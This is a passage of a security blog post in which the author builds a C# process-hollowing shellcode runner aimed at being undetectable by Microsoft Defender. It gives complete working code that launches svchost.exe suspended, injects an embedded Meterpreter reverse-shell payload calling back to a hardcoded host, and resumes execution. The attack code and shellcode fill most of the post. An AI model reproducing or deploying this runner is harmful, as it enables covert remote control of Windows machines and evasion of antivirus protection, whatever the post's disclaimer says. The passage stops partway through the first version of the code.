---
id: 1351
title: 'It’s All FUD and Games: Undetectable Process Hollowing on Windows'
date: '2023-10-08T00:46:11-05:00'
author: 'Logan Elliott'
excerpt: 'This post details how I created a process hollowing shellcode runner that is fully undetectable by Microsoft Defender as of October 2023.'
layout: post
guid: 'https://loganelliottinfosec.com/?p=1351'
permalink: /index.php/2023/10/08/its-all-fud-and-games-undetectable-process-hollowing-on-windows/
obfx-header-scripts:
    - ''
obfx-footer-scripts:
    - ''
post_sidebar:
    - right
single_post_layouts:
    - default
image: 'http://loganelliottinfosec.com/wp-content/uploads/2023/10/fd99b01a-0d4c-4af2-a94c-73e814770c35.webp'
tags:
    - 'Antivirus Evasion'
    - 'C#'
    - injection
    - 'Process Hollowing'
    - Windows
---
![](https://loganelliottinfosec.com/wp-content/uploads/2023/10/fd99b01a-0d4c-4af2-a94c-73e814770c35.webp)


**Table of Contents**
* TOC
{:toc}

**Disclaimer:** **The resources provided are for educational and research purposes only**. **I am, in no way, responsible for any misuse of these resources. The resources shown here should only be used legally for ethical hacking.**

Over the last few months, I went through the rigorous “PEN-300: Advanced Evasion Techniques and Breaching Defenses” course by OffSec, and what a journey it has been!

On my OSEP journey, I learned a great deal. A recurring theme throughout the course was creating custom shellcode runners with advanced antivirus evasion.

One type of shellcode runner that I found exceptionally fascinating was a process hollowing shellcode runner we created in C#.

After all was said and done, and I was OSEP certified, I decided to take another look at this shellcode runner to find out exactly how low I could get the detection rate.

Little did I know how far I would go down this rabbit hole, but after much experimentation and caffeine, I was finally left with a fully-undetectable process hollowing shellcode runner.

Buckle up because this will be a long ride.

Let’s get into it…

## Charting the Course: Goals and Objectives

The main goal I wanted to achieve with this research was creating a process hollowing shellcode runner that would be fully-undetectable by Microsoft Defender.

My shellcode runner needed to be undetected by the latest version of Microsoft Defender at scan-time, runtime, and during on-demand scanning with an active shell.

My secondary goal was to remain undetectable at scan-time against most antivirus vendors.

While I would have liked to be able to create a version that would be FUD to all antivirus, I scaled back my goals, as testing at runtime against the majority of antivirus would require more resources and time than I have as an independent researcher.

Additionally, the only two sites I’m aware of that scan at runtime without distribution seem to have been taken down:

**dyncheck.com**

**run4me.net**

That said, I settled on achieving FUD against Microsoft Defender because it is the most widely utilized antivirus.

<a tabindex="0">TLDR</a>

Using custom delegate functions is an effective way of obfuscating C# and other .NET based offensive tools.

This allows for the obfuscation of Win32 APIs that antivirus software will often flag.

While this technique has been documented before, I wanted to do it without the use of something like D/Invoke.

This technique dramatically reduced detection rates during testing, despite using P/Invoke DLL imports.

Using this tactic, I was able to create a process hollowing shellcode runner in C#, which is undetectable at scan-time and runtime against Microsoft Defender.

You can find the shellcode runners I created on my GitHub:

<https://github.com/Logan-Elliott/HollowGhost>

If you wanna skip to the PoC demonstration, click the big red button:

 [  
PoC  ](#fud-demo)

## What is process hollowing?

> Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.
> 
> Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` before being written to, realigned to the injected code, and resumed via `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, then `ResumeThread` respectively.
> 
> – <https://attack.mitre.org/techniques/T1055/012/>

## Picking a Process to Target

When attempting process hollowing, it is crucial to first identify a suitable process to inject the shellcode into. This is important, as specific processes do not normally generate network traffic, such as *explorer.exe*. It is best to target a process that regularly generates network traffic so that the callback from the payload and the subsequent traffic between the attacker and victim machine will not be detected over the network. Luckily for us attackers, there is a native Windows process that is perfect for this attack: *SvcHost.exe*.

Since svchost.exe typically generates network traffic, network traffic generated by our payload should blend in over the network when originating from this process. However, there are some important considerations to observe when attempting to inject into svchost.exe.

Firstly, all svchost.exe processes on Windows run at *SYSTEM* integrity level by default. Therefore, we cannot inject into a svchost.exe process from a lower integrity level. Secondly, if we attempt to simply launch svchost.exe and try to inject our shellcode into it directly, the process will immediately terminate.

This is where our process hollowing trade-craft will come in handy, as we can create a shellcode runner that will launch svchost.exe in a suspended state and modify it before it begins to execute.

Thus allowing us to execute our payload without terminating the process.

## Humble Beginnings: Creating the Initial C# Process Hollowing Shellcode Runner

Now that the fundamentals are out of the way, I will explain how I created the first version of the shellcode runner and explain how it works.

To start, I created a new “Console App (.NET Framework)” project in Visual Studio 2022:

![](http://loganelliottinfosec.com/wp-content/uploads/2023/09/vs-console-app.png)

I have decided to name this project “HollowGhost” because it fits, and more importantly, it sounds cool. 😎

![](http://loganelliottinfosec.com/wp-content/uploads/2023/09/create-cs-project.png)

First, we must import the proper namespaces needed for this program.

Luckily, there are only two required for the initial version of the shellcode runner:

```csharp
using System;
using System.Runtime.InteropServices; 
```

Ignore the **Main** method for now because we’ve got some construction to do. 👷

I first define several structs to be used with the Win32 API functions that will be called:

```csharp
namespace HollowGhost
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)] //Define how our new process window should be configured, this is from pinvoke.net
        struct STARTUPINFO //This struct is provided to CreateProcess api for its lpStartupInfo parameter
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)] //Define the process information
        internal struct PROCESS_INFORMATION //This struct is provided to the the lpProcessInformation parameter in the CreateProcess API
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)] //Define Process BASIC Information struct
        internal struct PROCESS_BASIC_INFORMATION //This struct will be passed to ZwQueryProcessInformation api in the 3rd argument/parameter
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
        static void Main(string[] args)
        {
        }
    }
} 
```

Now that the structures are defined we use DLL imports for the Win32 APIs we will call, which are:

- CreateProcess
- ZwQueryInformationProcess
- ReadProcessMemory
- WriteProcessMemory
- ResumeThread

```csharp
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] //Import CreateProcess API to create our suspended process
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)] //Import ZwQueryInformationProcess using pinvoke.net, this will allow us to discole the PEB and locate the entry point
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        //This api is very low level the docs show NTSTATUS, this returns a hex value directly from the kernel
        [DllImport("kernel32.dll", SetLastError = true)] //We must supply five parameters for this function. They are a process handle (hProcess), the address to read from (lpBaseAddress), a buffer to copy the content into (lpBuffer), the number of bytes to read (nSize), and a variable to contain the number of bytes actually read (lpNumberOfBytesRead).
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)] //We must import WriteProcessMemory got this from pinvoke.net
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)] //Import ResumeThread bc a already exists
        private static extern uint ResumeThread(IntPtr hThread); //Easy API bc it only has 1 parameter, which is the handle of the thread 
```

Now, to flesh out the Main method, this is where the svchost.exe process will be started in a suspended state, have a portion of its memory hollowed out, and the Meterpreter shellcode will be injected before it resumes execution:

```csharp
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO(); //Instantiate a STARTUPINFO and PROCESS_INFORMATION object
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\Windows\System32\svchost.exe", IntPtr.Zero, //We then supply our instantiated objects to CreateProcess
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION(); //We can now call ZwQueryInformationProcess and fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10); //ptrToImageBase var now contains a ptr to the img base of svchost.exe in the suspended process
            byte[] addrBuf = new byte[IntPtr.Size]; //Following the DllImport, we can call ReadProcessMemory by specifying an 8-byte buffer that is then converted to a 64bit integer through the BitConverter.ToInt648 method and then casted to a pointer using (IntPtr).
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            //It is worth noting that a memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process, so the use of variable types, offsets, and amount of data read must be adapted.
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            //The following step is to parse the PE header to locate the EntryPoint. This is performed by calling ReadProcessMemory again with a buffer size of 0x200 bytes 
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset when added to 0x28
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual address (RVA). We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            byte[] buf = new byte[676] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xdb, 0x53, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x48, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x53, 0x53, 0x48, 0x89, 0xe1, 0x53, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x30, 0x39, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x49, 0xc7, 0xc0, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x6a, 0x03, 0x53, 0x49, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x7a, 0x00, 0x00, 0x00, 0x2f, 0x53, 0x57, 0x51, 0x75, 0x63, 0x71, 0x59, 0x35, 0x62, 0x30, 0x6f, 0x6d, 0x53, 0x79, 0x64, 0x4a, 0x51, 0x31, 0x41, 0x70, 0x64, 0x67, 0x47, 0x53, 0x77, 0x58, 0x69, 0x41, 0x62, 0x50, 0x50, 0x6a, 0x33, 0x48, 0x32, 0x32, 0x37, 0x48, 0x68, 0x49, 0x57, 0x41, 0x5a, 0x55, 0x57, 0x66, 0x69, 0x6f, 0x42, 0x36, 0x46, 0x74, 0x79, 0x47, 0x75, 0x4b, 0x2d, 0x51, 0x6e, 0x58, 0x4e, 0x44, 0x44, 0x69, 0x57, 0x79, 0x35, 0x61, 0x38, 0x76, 0x52, 0x4f, 0x48, 0x74, 0x57, 0x45, 0x64, 0x62, 0x58, 0x5f, 0x77, 0x45, 0x63, 0x54, 0x50, 0x43, 0x4d, 0x53, 0x59, 0x69, 0x30, 0x46, 0x62, 0x58, 0x47, 0x53, 0x50, 0x72, 0x65, 0x6a, 0x50, 0x4b, 0x52, 0x35, 0x75, 0x4e, 0x5f, 0x42, 0x57, 0x51, 0x59, 0x32, 0x76, 0x6f, 0x7a, 0x32, 0x54, 0x57, 0x4b, 0x78, 0x00, 0x48, 0x89, 0xc1, 0x53, 0x5a, 0x41, 0x58, 0x4d, 0x31, 0xc9, 0x53, 0x48, 0xb8, 0x00, 0x32, 0xa8, 0x84, 0x00, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x6a, 0x1f, 0x5a, 0x52, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x6a, 0x04, 0x41, 0x59, 0x49, 0xba, 0x75, 0x46, 0x9e, 0x86, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x53, 0x5a, 0x48, 0x89, 0xf1, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x1f, 0x48, 0xc7, 0xc1, 0x88, 0x13, 0x00, 0x00, 0x49, 0xba, 0x44, 0xf0, 0x35, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0xff, 0xcf, 0x74, 0x02, 0xeb, 0xaa, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x53, 0x59, 0x6a, 0x40, 0x5a, 0x49, 0x89, 0xd1, 0xc1, 0xe2, 0x10, 0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, 0x49, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x49, 0xba, 0x12, 0x96, 0x89, 0xe2, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb2, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd2, 0x58, 0xc3, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5 };
            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode and use WriteProcessMemory to overwrite the existing code
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION structure, it also copied the handle of the main thread into it.
            //Thus we can call the handle of the thread directly as the argument to ResumeThread
            ResumeThread(pi.hThread);
            //We now have all the pieces to create a suspended process, hollow out its original code, replace it with our shellcode, and subsequently execute it.
        } 
```

### A Brief Overview of How This Works

I will not go very deep into how this code works as there are several resources online that already show this same type of shellcode runner and how it functions in detail.

For a more detailed explanation, I recommend reading the following blog post:

<https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-2/>

So this section will only briefly go over how the shellcode runner works so that the following sections on how I modified the code to decrease the detection rates will make more sense.

The first two lines of code within the **Main** method instantiate a **STARTUPINFO** and **PROCESS\_INFORMATION** object:

```csharp
            STARTUPINFO si = new STARTUPINFO(); //Instantiate a STARTUPINFO and PROCESS_INFORMATION object
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); 
```

We must instantiate these objects because they will be passed to **CreateProcess** to, well, create the process.

```csharp
            bool res = CreateProcess(null, "C:\Windows\System32\svchost.exe", IntPtr.Zero, //We then supply our instantiated objects to CreateProcess
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); 
```

The **CreateProcessW** API function accepts ten parameters, but there are only four parameters that we really need to pay attention to here.

You can view the documentation for the API here:

<https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw>

The second parameter, **lpCommandLine**, takes the file path to the process we want to execute as an argument. Here, we have given it the file path to svchost.exe.

The sixth parameter, **dwCreationFlags**, takes the flags that control the priority class and the creation of the process. We will pass this parameter the numerical representation of the CREATE\_SUSPENDED flag, “0x4”. This will cause the svchost.exe process to be created in a suspended state.

The ninth parameter, **lpStartupInfo**, is a pointer to the STARTUPINFO structure we created at the beginning of our program.

Lastly, the tenth parameter, **lpProcessInformation**, is a pointer to the PROCESS\_INFORMATION structure we created at the beginning of our program.

With this information, the **CreateProcessW** API can launch svchost.exe in a suspended state.

Next, we must utilize the Win32 API **ZwQueryInformationProcess** to locate the PEB address of the svchost.exe executable:

```csharp
           PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION(); //We can now call ZwQueryInformationProcess and fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10); //ptrToImageBase var now contains a ptr to the img base of svchost.exe in the suspended process 
```

With the PEB address of the executable located, the code then uses the **ReadProcessMemory** API function to parse the PEB of the remote process and perform some complicated math to obtain the full memory address of the EntryPoint:

```csharp
            byte[] addrBuf = new byte[IntPtr.Size]; //Following the DllImport, we can call ReadProcessMemory by specifying an 8-byte buffer that is then converted to a 64bit integer through the BitConverter.ToInt648 method and then casted to a pointer using (IntPtr).
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            //It is worth noting that a memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process, so the use of variable types, offsets, and amount of data read must be adapted.
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            //The following step is to parse the PE header to locate the EntryPoint. This is performed by calling ReadProcessMemory again with a buffer size of 0x200 bytes 
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset when added to 0x28
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual address (RVA). We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase); 
```

Yes, I know that skips over a lot, but if I didn’t, this post would be longer than a penguin’s debate on the merits of flying.

So, if you really want to understand how this code obtains the absolute EntryPoint, read the blog post I linked above.

Anyways, after we have obtained the absolute EntryPoint, we can use **WriteProcessMemory** to overwrite the existing code with our Meterpreter shellcode and call **ResumeThread** to continue the execution of svchost.exe:

```csharp
            byte[] buf = new byte[676] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xdb, 0x53, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x48, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x53, 0x53, 0x48, 0x89, 0xe1, 0x53, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x30, 0x39, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x49, 0xc7, 0xc0, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x6a, 0x03, 0x53, 0x49, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x7a, 0x00, 0x00, 0x00, 0x2f, 0x53, 0x57, 0x51, 0x75, 0x63, 0x71, 0x59, 0x35, 0x62, 0x30, 0x6f, 0x6d, 0x53, 0x79, 0x64, 0x4a, 0x51, 0x31, 0x41, 0x70, 0x64, 0x67, 0x47, 0x53, 0x77, 0x58, 0x69, 0x41, 0x62, 0x50, 0x50, 0x6a, 0x33, 0x48, 0x32, 0x32, 0x37, 0x48, 0x68, 0x49, 0x57, 0x41, 0x5a, 0x55, 0x57, 0x66, 0x69, 0x6f, 0x42, 0x36, 0x46, 0x74, 0x79, 0x47, 0x75, 0x4b, 0x2d, 0x51, 0x6e, 0x58, 0x4e, 0x44, 0x44, 0x69, 0x57, 0x79, 0x35, 0x61, 0x38, 0x76, 0x52, 0x4f, 0x48, 0x74, 0x57, 0x45, 0x64, 0x62, 0x58, 0x5f, 0x77, 0x45, 0x63, 0x54, 0x50, 0x43, 0x4d, 0x53, 0x59, 0x69, 0x30, 0x46, 0x62, 0x58, 0x47, 0x53, 0x50, 0x72, 0x65, 0x6a, 0x50, 0x4b, 0x52, 0x35, 0x75, 0x4e, 0x5f, 0x42, 0x57, 0x51, 0x59, 0x32, 0x76, 0x6f, 0x7a, 0x32, 0x54, 0x57, 0x4b, 0x78, 0x00, 0x48, 0x89, 0xc1, 0x53, 0x5a, 0x41, 0x58, 0x4d, 0x31, 0xc9, 0x53, 0x48, 0xb8, 0x00, 0x32, 0xa8, 0x84, 0x00, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x6a, 0x1f, 0x5a, 0x52, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x6a, 0x04, 0x41, 0x59, 0x49, 0xba, 0x75, 0x46, 0x9e, 0x86, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x53, 0x5a, 0x48, 0x89, 0xf1, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x1f, 0x48, 0xc7, 0xc1, 0x88, 0x13, 0x00, 0x00, 0x49, 0xba, 0x44, 0xf0, 0x35, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0xff, 0xcf, 0x74, 0x02, 0xeb, 0xaa, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x53, 0x59, 0x6a, 0x40, 0x5a, 0x49, 0x89, 0xd1, 0xc1, 0xe2, 0x10, 0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, 0x49, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x49, 0xba, 0x12, 0x96, 0x89, 0xe2, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb2, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd2, 0x58, 0xc3, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5 };
            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode and use WriteProcessMemory to overwrite the existing code
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION structure, it also copied the handle of the main thread into it.
            //Thus we can call the handle of the thread directly as the argument to ResumeThread
